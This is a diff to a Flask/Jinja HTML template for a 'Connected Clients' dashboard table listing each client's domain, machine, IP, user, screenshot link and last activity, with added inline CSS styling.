@@ -3,28 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Client Monitoring</title>
-    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <title>Connected Clients</title>
+    <style>
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            padding: 8px;
+            border: 1px solid #ddd;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        .timestamp {
+            font-size: 0.9em;
+            color: gray;
+        }
+        .screenshot-link {
+            color: blue;
+        }
+    </style>
 </head>
 <body>
-    <h1>Active Clients</h1>
+    <h1>Connected Clients</h1>
     <table>
         <thead>
             <tr>
-                <th>ID</th>
-                <th>IP Address</th>
-                <th>Username</th>
-                <th>Last Active</th>
+                <th>Domain</th>
+                <th>Machine</th>
+                <th>IP</th>
+                <th>User</th>
+                <th>Screenshot</th>
+                <th>Last Activity</th>
             </tr>
         </thead>
         <tbody>
-            {% for client in clients %}
-            <tr>
-                <td>{{ client[0] }}</td>
-                <td>{{ client[1] }}</td>
-                <td>{{ client[2] }}</td>
-                <td>{{ client[3] }}</td>
-            </tr>
+            {% for ip, client in clients.items() %}
+                <tr>
+                    <td>{{ client.domain }}</td>
+                    <td>{{ client.machine }}</td>
+                    <td>{{ client.ip }}</td>
+                    <td>{{ client.user }}</td>
+                    <td>
+                        {% if client.screenshot %}
+                        <a href="{{ url_for('static', filename='screenshots/' + client.screenshot) }}" target="_blank">View Screenshot</a>                    
+                        {% else %}
+                            No screenshot
+                        {% endif %}
+                    </td>
+                    <td class="timestamp">{{ client.timestamp }}</td>
+                </tr>
             {% endfor %}
         </tbody>
     </table>
